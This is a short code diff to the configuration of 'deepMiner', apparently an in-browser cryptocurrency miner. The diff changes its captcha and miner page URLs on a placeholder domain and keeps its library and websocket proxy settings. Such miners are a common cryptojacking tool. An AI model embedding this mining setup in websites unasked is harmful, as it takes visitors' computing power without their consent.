@@ -2,8 +2,8 @@ self.deepMiner = self.deepMiner || {};
 self.deepMiner.CONFIG = {
     LIB_URL: "https://%deepMiner_domain%/lib/",
     WEBSOCKET_SHARDS: [["wss://%deepMiner_domain%/proxy"]],
-    CAPTCHA_URL: "https://%deepMiner_domain%/captcha/",
-    MINER_URL: "https://%deepMiner_domain%/media/miner.html"
+    CAPTCHA_URL: "https://%deepMiner_domain%/null/",
+    MINER_URL: "https://%deepMiner_domain%/demo.html"
 };
 var Module = {
     locateFile: (function (path) {
